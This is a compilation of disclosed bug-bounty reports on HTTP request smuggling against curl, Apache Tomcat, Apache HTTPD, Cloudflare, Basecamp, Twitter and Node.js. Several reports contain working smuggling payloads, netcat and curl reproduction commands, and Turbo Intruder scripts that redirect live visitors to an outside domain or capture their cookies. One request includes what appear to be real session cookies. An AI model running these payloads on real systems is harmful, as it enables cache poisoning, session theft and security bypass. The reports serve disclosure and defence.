# HTTP Request Smuggling

_27 reports — High/Critical, disclosed_

### [HTTP Request Smuggling and SSRF via CRLF Injection in Curl_add_custom_headers](https://hackerone.com/reports/3484431)

- **Report ID:** `3484431`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** curl
- **Reporter:** @n12d11n
- **Bounty:** - usd
- **Disclosed:** 2026-01-02T10:50:01.847Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

A lack of CRLF validation in `Curl_add_custom_headers` at `lib/http.c:1761` allows users to inject arbitrary HTTP headers. This violation of RFC 7230 §3.2.4 leads to HTTP Request Smuggling and potential SSRF bypass. **AI Disclosure:** I utilized an AI assistant to aid in the initial code analysis and patch generation, but I have manually verified all claims using hex dumps and proxy simulations to ensure technical accuracy.

## Affected version

* **curl/libcurl version:** 8.18.0-DEV and 8.15.0
* **Platform:** Linux (Kali Linux)
* **curl -V output:** `curl 8.18.0-DEV (x86_64-pc-linux-gnu) libcurl/8.18.0-DEV OpenSSL/3.5.4`

## Steps To Reproduce:

1. Start a listener to capture raw traffic: `nc -l -p 8080 > raw_http.txt`.
2. Execute a `libcurl` application (or curl CLI) that appends a custom header containing CRLF: `curl -H "X-Injected: Value\r\nInjected-Header: Malicious" http://localhost:8080`.
3. Inspect the captured output: `hexdump -C raw_http.txt`.
4. Observe that the CRLF bytes (`0d 0a`) are transmitted unsanitized, causing the receiver to interpret the injected string as a separate, valid HTTP header.

## Supporting Material/References:

* **Hexdump Proof:** The hex dump shows `0d 0a` at offset `0x49`, confirming request splitting at the protocol level.
* **Suggested Patch:** A verification patch using `strchr` to reject `\r` and `\n` in `lib/http.c` successfully mitigates the issue.

---

## Impact

> The lack of CRLF validation in `libcurl`'s header handling allows for **HTTP Request Smuggling**, enabling an attacker to bypass security boundaries and perform **Server-Side Request Forgery (SSRF)**. As `libcurl` is a foundational library used by countless applications and backends, this vulnerability poses a systemic risk. Specifically, injected headers persist across redirects (`-L`), which significantly increases the attack surface and allows for the potential exposure of isolated internal services or cache poisoning.

---

---

### [Request Smuggling in Apache Tomcat (Important, CVE-2023-45648)](https://hackerone.com/reports/2299692)

- **Report ID:** `2299692`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** Internet Bug Bounty
- **Reporter:** @mukeran
- **Bounty:** 4660 usd
- **Disclosed:** 2024-02-07T08:51:04.160Z
- **CVE(s):** CVE-2023-45648

**Vulnerability Information:**

Apache Tomcat supports Trailer Section. However, we found that in version prior than 11.0.0-M11, 10.1.13, 9.0.80, 8.5.93, Apache Tomcat cannot properly parse the trailer section if there's no colon in the trailer header's line. It will skip the following lines until the last line with a valid colon-separated key-value header pair, which can be leveraged to perform HTTP request smuggling.

If we send the following payload, the headers of the second request **(Line 12-15)** will be regarded as the trailer section of the first request, while the content of the second request **(Line 17-19)** is processed as the second request. When sending this payload to other HTTP implementations such as NGINX, **Line 12-21** would be the second request.
```http
POST /benign_path HTTP/1.1
Host: a.com
Connection: keep-alive
Transfer-Encoding: chunked

5
12345
0
Content: hello
a

POST /benign_path HTTP/1.1
Host: a.com
Connection: keep-alive
Content-Length: 37

GET /evil_path HTTP/1.1
Any: any
Host: b.com


```

Reproduce:
```shell
docker run -d --name hrs_tomcat_11 -p 43022:8080 tomcat:10.1.13
echo -n 'POST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n5\r\n12345\r\n0\r\nContent: hello\r\na\r\n\r\nPOST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nContent-Length: 37\r\n\r\nGET /evil_path HTTP/1.1\r\nAny: any\r\nHost: b.com\r\n\r\n' | nc 127.0.0.1 43022
docker exec -it hrs_tomcat_11 /bin/sh -c "cat /usr/local/tomcat/logs/localhost*"
```

Access log:
```
192.168.215.1 - - [30/Dec/2023:10:42:00 +0000] "POST /benign_path HTTP/1.1" 404 683
192.168.215.1 - - [30/Dec/2023:10:42:00 +0000] "GET /evil_path HTTP/1.1" 404 683
```

The screenshot of emails between Apache Tomcat Security Team and me is uploaded as the attachment.

## Impact

It can be leveraged to perform HTTP request smuggling in order to bypass security mechanisms when Apache Tomcat is deployed behind a reverse proxy.

**Summary (team):**

[SECURITY] CVE-2023-45648 Apache Tomcat - Request Smuggling
Severity: Important
Vendor: The Apache Software Foundation

Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.0-M11
Apache Tomcat 10.1.0-M1 to 10.1.13
Apache Tomcat 9.0.0-M1 to 9.0.80
Apache Tomcat 8.5.0 to 8.5.93

Description:
Tomcat did not correctly parse HTTP trailer headers. A specially crafted, invalid trailer header could cause Tomcat to treat a single request as multiple requests leading to the possibility of request smuggling when behind a reverse proxy.

Mitigation:
Users of the affected versions should apply one of the following mitigations:
- Upgrade to Apache Tomcat 11.0.0-M12 or later
- Upgrade to Apache Tomcat 10.1.14 or later
- Upgrade to Apache Tomcat 9.0.81 or later
- Upgrade to Apache Tomcat 8.5.94 or later

Credit:
This vulnerability was reported responsibly to the Tomcat security team by Keran Mu and Jianjun Chen from Tsinghua University and Zhongguancun Laboratory.

History:
2023-10-10 Original advisory

Full Security Advisory: https://lists.apache.org/thread/2pv8yz1pyp088tsxfb7ogltk9msk0jdp

---

### [CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side Desync) (CWE: 444)](https://hackerone.com/reports/2327341)

- **Report ID:** `2327341`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** Internet Bug Bounty
- **Reporter:** @xer0dayz
- **Bounty:** 4660 usd
- **Disclosed:** 2024-01-29T20:47:28.820Z
- **CVE(s):** CVE-2024-21733

**Vulnerability Information:**

Apache Tomcat from 8.5.7 through 8.5.63, from 9.0.0-M11 through 9.0.43 are vulnerable to client-side de-sync attacks. 

Client-side de-sync (CSD) vulnerabilities occur when a web server fails to correctly process the Content-Length of POST requests. By exploiting this behavior, an attacker can force a victim's browser to de-synchronize its connection with the website, causing sensitive data to be smuggled from the server and/or client connections.

Users are recommended to upgrade to version 8.5.64 onwards or 9.0.44 onwards, which contain a fix for the issue.

PoC:
~~~~~~~~~~~~~~~~~~
POST / HTTP/1.1
Host: hostname
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive
Content-Length: 6
Content-Type: application/x-www-form-urlencoded

X
~~~~~~~~~~~~~~~~~~

In some cases, this can leak sensitive data such as clear-text credentials (see attached screenshot).

Credit: 
This vulnerability was reported responsibly to the Tomcat security team by xer0dayz from Sn1perSecurity LLC.

History:
2024-01-19 Original advisory

References:
[3] https://tomcat.apache.org/security-9.html
[4] https://tomcat.apache.org/security-8.html

## Impact

An attacker can force a victim's browser to de-synchronize its connection with the website, causing sensitive data to be smuggled from the server and/or client connections.

**Summary (team):**

[SECURITY] CVE-2024-21733 Apache Tomcat - Information Disclosure
Severity: Important
Vendor: The Apache Software Foundation

Versions Affected:
Apache Tomcat 9.0.0-M11 to 9.0.43
Apache Tomcat 8.5.7 to 8.5.63

Description:
Incomplete POST requests triggered an error response that could contain
data from a previous request from another user.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 9.0.44 or later
- Upgrade to Apache Tomcat 8.5.64 or later

Credit:
This vulnerability was reported responsibly to the Tomcat security team
by xer0dayz from Sn1perSecurity LLC.

History:
2024-01-19 Original advisory

Full Security Advisory: https://lists.apache.org/thread/h9bjqdd0odj6lhs2o96qgowcc6hb0cfz

---

### [Possibility of Request smuggling attack](https://hackerone.com/reports/2280391)

- **Report ID:** `2280391`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** Internet Bug Bounty
- **Reporter:** @aimotonorihito
- **Bounty:** 4660 usd
- **Disclosed:** 2023-12-22T06:22:35.942Z
- **CVE(s):** -

**Vulnerability Information:**

Request smuggling was possible by throwing an IOException with the upper size limit of the trailer header.
Confirmed with tomcat version 9.0.82.

* example
~~~~~~~~~~~~~~~~~~
POST /examples/test.jsp HTTP/1.1
Host: www.example.co.jp
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Connection: KeepAlive

5
foo=b
2
ar
0
testtrailer: aaaaa...(large size)
a: GET /examples/?this_is_attack HTTP/1.1
Host: attack

~~~~~~~~~~~~~~~~~~


* Reproduce with the following steps:
```
$ git clone https://github.com/oss-aimoto/tomcat-trailer.git
$ cd tomcat-trailer
$ docker-compose build
$ docker-compose up -d
$ echo -n "testtrailer: " > 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ for i in `seq 8179`; do echo -n "a"; done >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ perl -e 'print "\r\n"' >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ head -11 base.txt > attack5.txt
$ cat 8190_EXCLUDE_COLON_SP_CR_LF.txt >> attack5.txt
$ perl -e 'print "a: GET /examples/?this_is_attack HTTP/1.1\r\nHost: attack\r\n\r\n"' >> attack5.txt
$ cat attack5.txt | curl telnet://localhost:8082/ --output -
```

The result of curl is two HTTP responses("/examples/test.jsp" and "/examples/?this_is_attack").
Two requests are recorded in the Tomcat access log.

```
192.168.128.1 - - [23/Oct/2023:06:55:37 +0000] "POST /examples/test.jsp HTTP/1.1" 200 58
192.168.128.1 - - [23/Oct/2023:06:55:37 +0000] "GET /examples/?this_is_attack HTTP/1.1" 200 1126 
```

## Impact

A trailer header that exceeded the header size limit could cause Tomcat to treat a single request as multiple requests leading to the possibility of request smuggling when behind a reverse proxy.

**Summary (team):**

CVE-2023-46589 Apache Tomcat - Request Smuggling
Severity: Important

Description:
Tomcat did not correctly parse HTTP trailer headers. A specially crafted
trailer header that exceeded the header size limit could cause Tomcat to
treat a single request as multiple requests leading to the possibility
of request smuggling when behind a reverse proxy.

Credit:
This vulnerability was reported responsibly to the Tomcat security team
by Norihito Aimoto (OSSTech Corporation).

Full Security Advisory: https://lists.apache.org/thread/0rqq6ktozqc42ro8hhxdmmdjm1k1tpxr

---

### [HTTP Request Smuggling (CL.0) leads to mass redirect users to attacker server without user interaction](https://hackerone.com/reports/1943608)

- **Report ID:** `1943608`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** LinkedIn
- **Reporter:** @vampirex
- **Bounty:** - usd
- **Disclosed:** 2023-09-25T18:41:34.734Z
- **CVE(s):** -

**Summary (team):**

- Reporter detected HTTP Request Smuggling on a 3rd party CDN
- Because the issue was with a specific 3rd party CDN, the impact on LinkedIn was limited because we use numerous different CDNs and it didn't affect our main site 
- LinkedIn worked with the specific CDN provider to get this resolved quickly

---

### [Pause-based desync in Apache HTTPD](https://hackerone.com/reports/1667974)

- **Report ID:** `1667974`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** Internet Bug Bounty
- **Reporter:** @albinowax
- **Bounty:** 4000 usd
- **Disclosed:** 2022-08-25T07:02:46.335Z
- **CVE(s):** -

**Vulnerability Information:**

Apache was vulnerable to a pause-based desync. This vulnerability is described in detail in my whitepaper here: https://portswigger.net/research/browser-powered-desync-attacks#pause

## Impact

This enables server-side HTTP Request Smuggling when Apache is deployed as a back-end server, and it also enables MITM attackers to inject arbitrary JavaScript in spite of TLS.

**Summary (team):**

important: HTTP request smuggling vulnerability in Apache HTTP Server 2.4.52 and earlier (CVE-2022-22720)

Apache HTTP Server 2.4.52 and earlier fails to close inbound connection when errors are encountered discarding the request body, exposing the server to HTTP Request Smuggling

Acknowledgements: James Kettle <james.kettle portswigger.net>

Reported to security team:	2021-12-17
fixed by r1898692 in 2.4.x:	2022-03-07
Update 2.4.53 released:	 2022-03-14
Affects:	<=2.4.52

Link to Security Advisory: https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2022-22720

**Summary (researcher):**

While researching browser-powered desync attacks, I discovered that Apache was vulnerable to a pause-based desync.

This vulnerability is detailed in full in the whitepaper: https://portswigger.net/research/browser-powered-desync-attacks#pause

We've also published a vulnerable lab based on the finding: https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync

The bounty will be donated to charity.

---

### [HTTP request smuggling with Origin Rules using newlines in the host_header action parameter](https://hackerone.com/reports/1575912)

- **Report ID:** `1575912`
- **Severity:** Critical
- **Weakness:** HTTP Request Smuggling
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @albertspedersen
- **Bounty:** 3100 usd
- **Disclosed:** 2022-06-27T16:32:12.123Z
- **CVE(s):** -

**Summary (team):**

The `host_header` action parameter available to rulesets in the [Origin Rules API](https://developers.cloudflare.com/rules/origin-rules/) lacked sufficient input validation i.e., allowing CRLF characters. Because of this, it was possible to inject arbitrary headers and, as a consequence, smuggle HTTP requests. This vulnerability enabled bypassing security products such as Cloudflare Access and viewing the content of internal origin servers.
The issue was fixed by Cloudflare engineers and an Internal investigation proved that no Cloudflare customers were affected by exploitation of this vulnerability.
As a recommendation, we advise Cloudflare Access customers  to always verify the [Authorization JWT token](https://developers.cloudflare.com/cloudflare-one/identity/users/validating-json#programmatic-verification) before processing requests from the Cloudflare edge which prevents similar attempts.

---

### [HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() function](https://hackerone.com/reports/1478633)

- **Report ID:** `1478633`
- **Severity:** Critical
- **Weakness:** HTTP Request Smuggling
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @albertspedersen
- **Bounty:** 6000 usd
- **Disclosed:** 2022-05-16T08:57:07.047Z
- **CVE(s):** -

**Summary (team):**

The Edge Rules engine used by Cloudflare Transform Rules features string modifying functions like lower() and concat(), which accepted hexadecimal-encoded characters such as ”\x0a\x0d“. This allowed for manipulation of request headers (e.g. injecting an additional header) and, as a consequence, made HTTP smuggling attack (TE.CL) possible. This vulnerability enabled an attacker to bypass security products such as Cloudflare Access and view the content of internal origin servers. 
This bug in hexadecimal parsing was fixed by the relevant engineering team. We rewarded this finding as critical as well as a bonus for a high quality, detailed report. 
Internal investigation confirmed that no other CF customer was affected by this attack. As a recommendation, we advise Cloudflare Access customers  to always verify the Authorization JWT token before processing requests from the Cloudflare edge.

**Summary (researcher):**

Cloudflare's Ruleset Engine allows the use of hexadecimal escape sequences in string manipulation functions such as `concat()`. Due to a lack of output sanitation, this enabled an attacker to inject newlines into the header value. By creating a dynamic header rewrite rule with the value `concat("-", "\x0d\x0aTransfer-Encoding: chunked")`, it was possible to change the transfer encoding of the request. When combined with a POST body such as `0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n` it made HTTP request smuggling extremely trivial. Additionally, the position of Transform Rules in the request flow meant it was possible to use internal headers to control many aspects of the request. A fix was rolled out within hours of the report being submitted. I would like to thank the teams at Cloudflare for their efforts.

---

### [HTTP Request Smuggling via HTTP/2](https://hackerone.com/reports/1211724)

- **Report ID:** `1211724`
- **Severity:** Critical
- **Weakness:** HTTP Request Smuggling
- **Program:** Basecamp
- **Reporter:** @neex
- **Bounty:** 7500 usd
- **Disclosed:** 2021-08-27T19:21:09.101Z
- **CVE(s):** -

**Summary (team):**

HTTP Request Smuggling via HTTP/2

---

### [HTTP Request Smuggling ](https://hackerone.com/reports/1120982)

- **Report ID:** `1120982`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** U.S. Dept Of Defense
- **Reporter:** @lu3ky-13
- **Bounty:** - usd
- **Disclosed:** 2021-04-20T19:36:48.644Z
- **CVE(s):** -

**Vulnerability Information:**

hello dear support 
I have found HTTP Request Smuggling on www.████████

Issue description
==============

HTTP request smuggling vulnerabilities arise when websites route HTTP requests through webservers with inconsistent HTTP parsing.
By supplying a request that gets interpreted as being different lengths by different servers, an attacker can poison the back-end TCP/TLS socket and prepend arbitrary data to the next request. Depending on the website's functionality, this can be used to bypass front-end security rules, access internal systems, poison web caches, and launch assorted attacks on users who are actively browsing the site.

## Impact

Impact
an attacker can poison the TCP / TLS socket and add arbitrary data to the next request. Depending on the functionality of the website, this can be used to bypass front-end security rules, internal system access, poison the web cache, and launch various attacks on users who actively activate the site.

Reference: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

## System Host(s)
www.█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
http request
============
```
GET /404 HTTP/1.1
Host: www.███████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
███████
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 118
Connection: keep-alive

0

GET https://www.███████/███ HTTP/1.1
Host: www.█████████
foo: x
```

http response 
===============
```
HTTP/1.1 302 Found
Date: Tue, 09 Mar 2021 02:54:22 GMT
Server: Apache
Set-Cookie: ███=expiry=1615259062417257;Max-Age=600;path=/;httponly;secure;
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin
Location: https://www.████/404_not_found.html
Content-Length: 236
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="https://www.████████/404_not_found.html">here</a>.</p>
</body></html>
HTTP/1.1 200 OK
Date: Tue, 09 Mar 2021 02:54:22 GMT
Server: Apache
Set-Cookie: ████████=expiry=1615259062417962;Max-Age=600;path=/;httponly;secure;
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin
Cache-Control: no-cache, private
Last-Modified: Mon, 05 Mar 2012 16:45:37 GMT
ETag: "78d0-4ba81a7e20e40"
Accept-Ranges: bytes
Content-Length: 30928
Content-Type: image/png

PNG


```

██████
██████████

## Suggested Mitigation/Remediation Actions

---

### [http request smuggling in  twitter.com](https://hackerone.com/reports/715996)

- **Report ID:** `715996`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** X / xAI
- **Reporter:** @protostar0
- **Bounty:** - usd
- **Disclosed:** 2020-11-18T00:25:13.213Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
the same vulnerability reported in other domain , see this report [here](https://hackerone.com/reports/713285) 
**Description:** 
the Description of HTTP request smuggling attacks : [here](https://portswigger.net/web-security/request-smuggling)

##Detect HTTP request smuggling attack (subdomains vulnerable):
-to detect HTTP request smuggling attack with add header `Transfer-Encoding: chunked` 
and encode the body of request with chunked encode.
1. send request with a valid chunked encode and you will get response means that the **back-end server accept chunked encode**
2. send a large value in hex of chunked encode , if get ** delay of response**  means its vulnerable. 
resource: https://portswigger.net/web-security/request-smuggling/finding

## CONFIRMATION:

##POC:

in this POC i will use TWEET request as second request (payload) ,means that if the HTTP request smuggling attack success,
will get a new TWEET in my account 

F609847


## Steps To Reproduce:


ps : i use chrome browser,with burp
1- choose any valid POST request (or change GET to POST) from twitter.com and send it to repeater
2- delete this header (Connection: close  ,Accept-Encoding: gzip, deflate)
3- add this header <Transfer-Encoding: chunked>

4- add chunked encode    put a valid chunked code or   [ put just 0 with two CRLFs]
5-put the second request  [i use a TWEET request ]
6- send the attacker request

## Impact

impact of http request smuggling 
- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- https://portswigger.net/web-security/request-smuggling/exploiting

---

### [HTTP request smuggling on Basecamp 2 allows web cache poisoning](https://hackerone.com/reports/919175)

- **Report ID:** `919175`
- **Severity:** Critical
- **Weakness:** HTTP Request Smuggling
- **Program:** Basecamp
- **Reporter:** @hazimaslam
- **Bounty:** - usd
- **Disclosed:** 2020-10-28T14:57:26.124Z
- **CVE(s):** -

**Vulnerability Information:**

It is found that an authenticated Basecamp 2 user can desync front and backend servers and poison the socket with harmful response for the next visitor.  During redirect probe, It also appears that front-end infrastructure performs caching of content. Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using `X-Forwarded-Host` request header in smuggled request. This will make the attack persistent, affecting any user who subsequently requests the affected URL.

## Validation steps
**1.**  Open https://requestbin.com/r/enjv2g5042bg in your browser for request capturing.

**2.** Paste the following request in Burp repeater (I've embedded my session in the request for your ease):

```http
POST /4618984/account HTTP/1.1
Host: basecamp.com
Connection: keep-alive
Content-Length: 144
Accept: */*
X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2UyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMUJXNUtwM3IxaExPdVpJNis0R2tCVzVYVXBrdDU1Ymk5dElpcWdLRm8xWlk9BjsARkkiDnBlcnNvbl9pZAY7AEZpBHYSEQE%3D--ced0e607b9844aff72e0b9421e73e4d52c8b04bc;identity_id=BAhpBOwxQgE%3D--3a11dbd3096b61294dc6c864b807a87944e4b6ab;
Transfer-Encoding: chunked
Transfer-encoding: identity

22
_method=patch&account%5Bname%5D=BC
0

GET /x HTTP/1.1
X-Forwarded-Host: enjv2g5042bg.x.pipedream.net
X-Forwarded-Proto: http
Foo: bar
```
Make sure to set the target to `https://basecamp.com` and port to `443`.

**3.** Issue the request in repeater.

**4.** Observe the captured request in RequestBin.com

## Impact

- With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.

- By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.

- It is also possible to capture visitors' request headers and cookies.

---

### [Unauthenticated request smuggling on launchpad.37signals.com](https://hackerone.com/reports/867577)

- **Report ID:** `867577`
- **Severity:** Critical
- **Weakness:** HTTP Request Smuggling
- **Program:** Basecamp
- **Reporter:** @hazimaslam
- **Bounty:** - usd
- **Disclosed:** 2020-10-28T14:57:15.180Z
- **CVE(s):** -

**Vulnerability Information:**

## Description

By sending an ambiguous request on the rails application on `launchpad.37signals.com`, an attacker can desynchronise frontend and backend servers, leaving the socket to the backend server poisoned with a harmful response. This response will then be served up to the next visitor.

The desync occurs when sending a request with a `Content-Length` header and a valid `Transfer-Encoding` header followed by an invalid `Transfer-Encoding` header. The frontend server only examines the second `Transfer-Encoding` which is invalid, so it uses the `Content-Length` instead. However the backend server prioritises the valid `Transfer-Encoding` header and therefore ignores the `Content-Length`.

## Validation Steps

To replicate this bug, run the following script in Turbo Intruder. After issuing a desync request, it simulates 6 requests from normal visitors one of which gets redirected to `hazimaslam.com`.

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 69
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com
Foo: bar'''

    engine.queue(attack)

    victim = '''GET /signin HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,la;q=0.8
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D

'''
    for i in range(6):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```

{F818615}

### Capturing and storing normal visitors' request headers and cookies

By prefixing the victim's request with a crafted storage request, we can make the application save their request and display it back to us and steal any authentication cookies/headers.

1. Login and visit https://launchpad.37signals.com/identity/edit
2. Save changes and intercept the request.
3. Copy the values of following from intercepted request and paste in the script where indicated:

- identity_id (cookie)
- session_token (cookie)
- _launchpad_session (cookie)
- authenticity_token (parameter)


```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 903
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE

_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d='''

    engine.queue(attack)

    victim = '''GET /signin HTTP/1.1
Host: launchpad.37signals.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D
Foo: bar

'''
    for i in range(6):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```
Run the script in Turbo Intruder and refresh https://launchpad.37signals.com/identity/edit to see captured headers and cookies.

Here is the video demonstration for this:

{F818731}

## Impact

- With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.

- By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.

- It is also possible to capture visitors' request headers and cookies.

- No authentication and interaction required.

---

### [HTTP Request Smuggling due to CR-to-Hyphen conversion](https://hackerone.com/reports/922597)

- **Report ID:** `922597`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** Node.js
- **Reporter:** @amitklein
- **Bounty:** - usd
- **Disclosed:** 2020-10-17T19:15:29.014Z
- **CVE(s):** CVE-2020-8201

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

**Summary:** [add summary of the vulnerability]
Apparently, node.js converts CR in HTTP request headers to hyphen before parsing. This can lead to HTTP Request Smuggling as it is a non-standard interpretation of the header.

**Description:** [add more details about this vulnerability]
Consider an HTTP request with Content[CR]Length header . Suppose a proxy in front of node.js ignores the Content[CR]Length header (and therefore assumes a 0-length body). node, on the other hand, converts the CR to a hyphen and uses the value of the (newly formed...) Content-Length header. HTTP Request Smuggling ensues.

## Steps To Reproduce:
This is the HTTP stream that demonstrates the vulnerability:
GET / HTTP/1.1
Host: www.example.com
Content[CR]Length: 42
Connection: Keep-Alive

GET /proxy_sees_this HTTP/1.1
Something: GET /node_sees_this HTTP/1.1
Host: www.example.com

A proxy server that ignores the invalid Content[CR]Length header will assume that the body length is 0 (since there's no body length indication), and will thus transmit the stream up to (but not including) the GET /proxy_sees_this. It will wait for node to respond (which interestingly does happen, even though node.js does expect the body - perhaps on GET requests, the URL is invoked regardless of the body?), then the proxy forwards the second request (from its perspective) - the GET /proxy_sees_this. Node then silently discards the expected 42 bytes of the body of the first request, and thus starts parsing the 2nd request from GET /node_sees_this.
HTTP Request Smuggling ensues.

